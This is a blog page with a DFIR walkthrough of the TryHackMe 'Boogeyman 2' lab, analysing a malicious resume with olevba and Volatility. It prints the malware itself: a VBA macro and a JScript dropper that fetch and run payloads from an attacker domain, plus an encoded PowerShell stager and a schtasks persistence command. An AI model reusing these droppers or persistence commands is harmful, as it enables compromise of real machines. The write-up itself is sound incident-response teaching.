@@ -1,0 +1,176 @@
+<!doctype html><html lang=en-us><head><title>Boogeyman 2 | alfa7i7</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=generator content="Hugo 0.148.0"><link rel=canonical href=/side-quests/thm-boogeyman-2/><link href=/css/style.min.041e4a3e04c8d069c51f822569eabf716b17b3aec0c9052ef93405591a10b665.css rel=stylesheet><script src=https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0})</script></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a class=terminal href=/><span>alfa7i7@empire ~ $</span></a></div><input class=side-menu type=checkbox id=side-menu>
+<label class=hamb for=side-menu><span class=hamb-line></span></label><nav class=headerLinks><ul><li><a href=/posts title>~/blog</a></li><li><a href=/side-quests title>~/side-quests</a></li><li><a href=/whoami title>~/whoami</a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Boogeyman 2</h1><section class=postMetadata><dl><dt>tags</dt><dd><span></span>
+<a href=/tags/dfir/>#DFIR</a><span></span>
+<a href=/tags/phishing/>#Phishing</a><span></span>
+<a href=/tags/volatility/>#Volatility</a><span></span>
+<a href=/tags/olevba/>#Olevba</a></dd><dt>categories</dt><dd><span></span>
+<a href=/categories/tryhackme/>TryHackMe</a><span></span>
+<a href=/categories/soc-1/>SOC 1</a></dd><dt>published</dt><dd><time datetime=2024-11-05>November 5, 2024</time></dd><dt>reading time</dt><dd>6 minutes</dd></dl></section><div><p><img src=boogeybanner.png alt=banner></p><blockquote><p>After having a severe attack from the Boogeyman, Quick Logistics LLC improved
+its security defences. However, the Boogeyman returns with new and improved
+tactics, techniques and procedures..</p></blockquote><p>Story time:</p><blockquote><p>Maxine, a Human Resource Specialist working for Quick Logistics LLC, received
+an application from one of the open positions in the company. Unbeknownst to
+her, the attached resume was malicious and compromised her workstation.
+The security team was able to flag some suspicious commands executed on the
+workstation of Maxine, which prompted the investigation. Given this, you are
+tasked to analyse and assess the impact of the compromise.</p></blockquote><h1 id=i-email-analysis>I. Email analysis</h1><p>Another phishing campaign was successful, shout out to the Boogeyman
+perseverance. That is actually not surprising knowing that phishing was and
+still one of the top initial access vectors.</p><p>Let&rsquo;s take a look at our phishing email. Basic information; Wesley Taylor
+sent a job application to Maxine Beck and attached his resume
+<code>Resume_WesleyTaylor.doc</code> with the email:</p><p><img src=image.png alt="the phishing email"></p><p>Md5 hash of the email attachement:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ md5sum Resume_WesleyTaylor.doc
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>52c4384a0b9e248b95804352ebec6c5b  Resume_WesleyTaylor.doc
+</span></span></code></pre></div><p>To analyze this Office document, we&rsquo;ll be using Olevba, which is a tool for
+analysing and extracting VBA macros from Microsoft Office documents. This tool
+is also a part of the <a href=https://github.com/decalage2/oletools>Oletools suite</a>.</p><p>Using the tool is pretty straight forward, let&rsquo;s check the result of anlyzing
+Wesley&rsquo;s resume:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ olevba Resume_WesleyTaylor.doc 
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
+</span></span><span style=display:flex><span>Sub AutoOpen()
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>spath = &#34;C:\ProgramData\&#34;
+</span></span><span style=display:flex><span>Dim xHttp: Set xHttp = CreateObject(&#34;Microsoft.XMLHTTP&#34;)
+</span></span><span style=display:flex><span>Dim bStrm: Set bStrm = CreateObject(&#34;Adodb.Stream&#34;)
+</span></span><span style=display:flex><span>xHttp.Open &#34;GET&#34;, &#34;https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png&#34;, False
+</span></span><span style=display:flex><span>xHttp.Send
+</span></span><span style=display:flex><span>With bStrm
+</span></span><span style=display:flex><span>    .Type = 1
+</span></span><span style=display:flex><span>    .Open
+</span></span><span style=display:flex><span>    .write xHttp.responseBody
+</span></span><span style=display:flex><span>    .savetofile spath &amp; &#34;\update.js&#34;, 2
+</span></span><span style=display:flex><span>End With
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Set shell_object = CreateObject(&#34;WScript.Shell&#34;)
+</span></span><span style=display:flex><span>shell_object.Exec (&#34;wscript.exe C:\ProgramData\update.js&#34;)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>End Sub
+</span></span><span style=display:flex><span>+----------+--------------------+---------------------------------------------+
+</span></span><span style=display:flex><span>|Type      |Keyword             |Description                                  |
+</span></span><span style=display:flex><span>+----------+--------------------+---------------------------------------------+
+</span></span><span style=display:flex><span>| ...SNIP...                                                                  |
+</span></span><span style=display:flex><span>|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+</span></span><span style=display:flex><span>|          |                    |used to obfuscate strings (option --decode to|
+</span></span><span style=display:flex><span>|          |                    |see all)                                     |
+</span></span><span style=display:flex><span>|IOC       |https://files.boogey|URL                                          |
+</span></span><span style=display:flex><span>|          |manisback.lol/aa2a9c|                                             |
+</span></span><span style=display:flex><span>|          |53cbb80416d3b47d8553|                                             |
+</span></span><span style=display:flex><span>|          |8d9971/update.png   |                                             |
+</span></span><span style=display:flex><span>|IOC       |update.js           |Executable file name                         |
+</span></span><span style=display:flex><span>|IOC       |wscript.exe         |Executable file name                         |
+</span></span><span style=display:flex><span>+----------+--------------------+---------------------------------------------+
+</span></span></code></pre></div><p>As we can see, the <code>.doc</code> document was a first stage of the actual payload. The
+second stage can be spotted very easly from the HTTP request to Boogeyman&rsquo;s
+server <code>files.boogeymanisback.lol</code>.</p><p>The file <code>update.png</code> was downloaded and saved to <code>C:\ProgramData\</code> as
+<code>update.js</code>. An instance of <code>WScript.shell</code> was then created to access
+OS shell methods. We can infere that <code>update.js</code> is actually a PowerShell script.</p><p>With these information, we can proceed to analyse the memory image.</p><h1 id=ii-memory-forensics>II. Memory forensics</h1><p>Having an image of the compromised machine&rsquo;s memory, we can start our
+investigation by checking the list of running processes, knowing from the
+previous results that the malicious document executed <code>wscript.exe</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ vol -f WKSTN-2961.raw windows.pslist
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Volatility 3 Framework 2.5.0
+</span></span><span style=display:flex><span>Progress:  100.00		PDB scanning finished                        
+</span></span><span style=display:flex><span>PID	    PPID	ImageFileName	Offset(V)	    Threads	Handles	SessionId	Wow64	CreateTime	                ExitTime	File output
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>4260	1124	wscript.exe	    0xe58f864ca0c0	6	    -	    3	        False	2023-08-21 14:12:47.000000 	N/A	        Disabled
+</span></span><span style=display:flex><span>6216	4260	updater.exe	    0xe58f87ac0080	18	    -	    3	        False	2023-08-21 14:12:48.000000 	N/A	        Disabled
+</span></span><span style=display:flex><span>4464	6216	conhost.exe	    0xe58f84bd1080	5	    -	    3	        False	2023-08-21 14:14:03.000000 	N/A	        Disabled
+</span></span><span style=display:flex><span>6332	6932	DumpIt.exe	    0xe58f87a870c0	3	    -	    3	        True	2023-08-21 14:14:25.000000 	N/A	        Disabled
+</span></span></code></pre></div><p><code>wscript.exe</code> PID is 4260 and its parent PID is 1124 (which is <code>WORD.exe</code> btw).
+We are very curious about what is the content of the 2nd stage of the payload so
+we&rsquo;ll try to find and extract that <code>update.png</code> file. Volatility plugin
+<code>filescan</code> scans for file objects present in a particular region/or the entire
+Windows memory image. We use this pluging to check for files of Maxine that are
+loaded to memory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ vol -f WKSTN-2961.raw windows.filescan | grep maxine
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>0xe58f836ebeb0  \Users\maxine.beck\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\CAF4703619713E3F18D8A9D5D88D6288_F2DAF19C1F776537105D08FC8D978464        216
+</span></span><span style=display:flex><span>0xe58f836ec4f0  \Users\maxine.beck\Music\desktop.ini    216
+</span></span><span style=display:flex><span>0xe58f836edc60  \Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\IE\GEX3PLZ6\update[1].png  216
+</span></span><span style=display:flex><span>0xe58f83bd4600  \Users\maxine.beck\AppData\Local\Microsoft\Office\16.0\WebServiceCache\AllUsers\officeclient.microsoft.com\CF5B04DF-852B-4FCA-92D6-E3B99CF5ED2F 216
+</span></span><span style=display:flex><span>0xe58f8609a110  \Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache    216
+</span></span><span style=display:flex><span>0xe58f862dc3d0  \Users\maxine.beck\AppData\Local\Packages\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\Settings\settings.dat     216
+</span></span><span style=display:flex><span>0xe58f86465740  \Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc     216
+</span></span><span style=display:flex><span>...SNIP...
+</span></span></code></pre></div><p>Look at that <code>update[1].png</code>, it looks like our file.</p><p>We can use another plugin, i.e. <code>dumpfile</code>, to extract that file from memory
+given its virtual address.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ vol -f WKSTN-2961.raw windows.dumpfiles --virtaddr 0xe58f836edc60
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Volatility 3 Framework 2.5.0
+</span></span><span style=display:flex><span>Progress:  100.00		PDB scanning finished                        
+</span></span><span style=display:flex><span>Cache	FileObject	FileName	Result
+</span></span><span style=display:flex><span>DataSectionObject	0xe58f836edc60	update[1].png	file.0xe58f836edc60.0xe58f87ddb320.DataSectionObject.update[1].png.dat
+</span></span></code></pre></div><p>Here we go. This turned out to be a famous malware and even my Windows Defender
+detected its pattern and flaged it (the whole Markdown file where I&rsquo;m writing
+this) as malicious.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>var Object = WScript.CreateObject(<span style=color:#e6db74>&#39;MSXML2.XMLHTTP&#39;</span>);
+</span></span><span style=display:flex><span>var wshell = new ActiveXObject(<span style=color:#e6db74>&#34;WScript.Shell&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>var location = <span style=color:#e6db74>&#34;C:\\Windows\\Tasks\\&#34;</span>;
+</span></span><span style=display:flex><span>var filename = <span style=color:#e6db74>&#34;updater.exe&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>var url = <span style=color:#e6db74>&#34;https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe&#34;</span>
+</span></span><span style=display:flex><span>Object.Open(<span style=color:#e6db74>&#39;GET&#39;</span>, url, false);
+</span></span><span style=display:flex><span>Object.Send();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (Object.Status == <span style=color:#ae81ff>200</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span> var Stream = WScript.CreateObject(<span style=color:#e6db74>&#39;ADODB.Stream&#39;</span>);
+</span></span><span style=display:flex><span> Stream.Open();
+</span></span><span style=display:flex><span> Stream.Type = <span style=color:#ae81ff>1</span>; // Stream type <span style=color:#ae81ff>1</span> to set binary stream
+</span></span><span style=display:flex><span> Stream.Write(Object.ResponseBody);
+</span></span><span style=display:flex><span> Stream.<span style=color:#a6e22e>Position</span> = <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span> Stream.SaveToFile(location + filename, <span style=color:#ae81ff>2</span>); // option <span style=color:#ae81ff>2</span> to force overwrite
+</span></span><span style=display:flex><span> Stream.Close();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>wshell.Run(<span style=color:#e6db74>&#34;cmd.exe /c reg.exe add \&#34;</span>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\<span style=color:#e6db74>&#34; /v C:\\Windows\\Tasks /f&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>wshell.Run(location + filename);
+</span></span><span style=display:flex><span>WScript.Sleep(<span style=color:#ae81ff>5</span>*<span style=color:#ae81ff>60</span>*<span style=color:#ae81ff>1000</span>);
+</span></span></code></pre></div><p>As we can see, the script starts by downloading a binary <code>update.exe</code> and saving
+it to <code>C:\Windows\Tasks\updater.exe</code>. The <code>C:\Windows\Tasks</code> folder is
+typically used by the Task Scheduler in Windows to store information about
+scheduled tasks.
+On the other hand, the <code>User Shell Folders</code> registry key in Windows is used to
+define the locations of various user profile folders, such as the Desktop,
+Documents, Downloads, and others. These folders are part of the user&rsquo;s environment,
+and Windows uses this registry key to identify where certain default folders are
+stored. This allows applications and Windows itself to retrieve paths for
+commonly used directories, which can vary by user or be redirected to network
+locations.</p><p>It looks like Boogeyman is trying to alter system behavior to run malware
+whenever the user accesses or saves data to a specific folder, thereby making
+himself more persistent and harder to remove.</p><p>Looking back to the processes list, <code>updater.exe</code>&rsquo;s PID is 6216.
+Based on this information, we trace the connections to the C2 server using
+<code>netscan</code> plugin:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ vol -f WKSTN-2961.raw windows.netscan
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Offset	        Proto	LocalAddr	LocalPort   ForeignAddr ForeignPort	State	PID	    Owner	    Created
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>0xe58f86a9d950	UDPv4	0.0.0.0         0           *	0		660         lsass.exe	2023-08-21 13:59:26.000000 
+</span></span><span style=display:flex><span>0xe58f86a9d950	UDPv6	::	        0           *	0		660 	    lsass.exe	2023-08-21 13:59:26.000000 
+</span></span><span style=display:flex><span>0xe58f86b1b770	TCPv4	10.10.49.181	63331	    128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:15:17.000000 
+</span></span><span style=display:flex><span>0xe58f86b73010	TCPv4	10.10.49.181	63308	    128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:39.000000 
+</span></span><span style=display:flex><span>0xe58f86b9ebf0	TCPv4	10.10.49.181	63291	    128.199.95.189	8080	CLOSED	6216	updater.exe	2023-08-21 14:14:13.000000 
+</span></span><span style=display:flex><span>0xe58f86ba7bf0	TCPv4	10.10.49.181	63242	    20.189.173.10	443	    CLOSED	1124	WINWORD.EXE	2023-08-21 14:12:39.000000 
+</span></span></code></pre></div><p>At last, the last piece of information we are curious about; what the Boogey
+scheduled on the compromised machine?</p><p>We know that <code>schtasks.exe</code> is the process used to do schedule jobs on windows.
+However, the process is not listed using neither <code>pslist</code> nor <code>psscan</code>, and no
+command line traces of its execution are available with <code>cmdline</code> plugin.
+Thus, there is nothing Volatility can do for us.</p><p>A harsh approch would consist of parsing the memory image for entries with
+<code>schtasks</code> string. This actually works and as we can see, there is a message
+indicating C2 connection successful establishment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ cat -A WKSTN-2961.raw | grep schtask
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
+</span></span><span style=display:flex><span>M-^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+</span></span><span style=display:flex><span>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+</span></span><span style=display:flex><span>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+</span></span><span style=display:flex><span>^@^@^@^@^@^@^@^@^@^@BkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGgAbABGAEsAcwBBAE8AagA9AFkAYg
+</span></span><span style=display:flex><span>BNAEwANwAxAGsAUgBtAEsAZQBBADUAMAAzAE0AOABWAGoAcwA4AFcAOABXADQAZgBZAD0AIgApADsAJABkAGEAdABhAD0AJAB3AG
+</span></span><span style=display:flex><span>MALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACQAcwBlAHIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAdABhAFsAMAAuAC4AMw
+</span></span><span style=display:flex><span>BdADsAJABkAGEAdABhAD0AJABkAGEAdABhAFsANAAuAC4AJABkAGEAdABhAC4AbABlAG4AZwB0AGgAXQA7AC0AagBvAGkAbgBbAE
+</span></span><span style=display:flex><span>MAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=;schtasks /Cre
+</span></span><span style=display:flex><span>ate /F /SC DAILY /ST 09:00 /TN Updater /TR &#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.ex
+</span></span><span style=display:flex><span>e -NonI -W hidden -c \&#34;IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp 
+</span></span><span style=display:flex><span>HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\&#34;&#39;;&#39;Schtasks persistence established
+</span></span><span style=display:flex><span>using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater dai
+</span></span><span style=display:flex><span>ly trigger at 09:00.&#39;^M$
+</span></span><span style=display:flex><span>...SNIP...
+</span></span></code></pre></div></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
+<a href=https://gohugo.io class=footerLink>Hugo</a> and
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
